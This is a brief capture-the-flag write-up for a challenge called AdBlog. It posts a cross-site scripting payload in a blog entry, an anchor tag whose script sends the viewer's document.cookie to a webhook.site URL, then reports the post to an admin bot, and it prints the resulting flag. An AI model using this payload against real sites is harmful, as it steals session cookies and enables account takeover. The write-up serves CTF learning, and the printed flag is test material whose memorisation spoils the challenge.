# Write-up :AdBlog
* *1.Post a blog with that content :*
```javascript 
<a id=showOverlay href="cid:function xss() {document.location=`https://webhook.site/455fcac5-9c2c-4a81-990c-445705038802/?flag=${document.cookie}`}xss()"></a> 
```
* *2.go to report url and report the id of the blog where you put the payload*
* *3.get the flag!!*

**flag : CakeCTF{setTimeout_3v4lu4t3s_str1ng_4s_a_j4va5cr1pt_c0de}**



